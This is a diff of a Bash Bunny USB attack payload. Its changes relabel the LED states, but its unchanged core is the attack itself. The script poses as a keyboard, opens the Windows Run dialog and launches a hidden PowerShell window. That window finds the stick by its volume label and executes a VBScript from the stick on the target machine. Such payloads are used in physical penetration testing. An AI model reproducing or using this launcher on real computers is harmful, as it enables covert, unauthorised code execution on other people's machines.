@@ -8,7 +8,7 @@
 #Define your bunny storage stick name
 DRIVER_LABEL='BashBunny'
 
-#RED means starting
+#Setup
 LED SETUP
 
 #Gets File locations
@@ -16,14 +16,15 @@ GET SWITCH_POSITION
 
 #We are a keyboard
 ATTACKMODE HID STORAGE
-
+#Attack
+LED ATTACK
 
 QUACK DELAY 500
 RUN WIN powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\a.vbs')"
 QUACK DELAY 1000
 
-# GREEN means finished
-LED G
+# Done!
+LED FINISH
 
 #If you would like to bash bunny to shutdown/exit/dismount from the target system after execution, you can uncomment the lines below
 #QUACK DELAY 4500
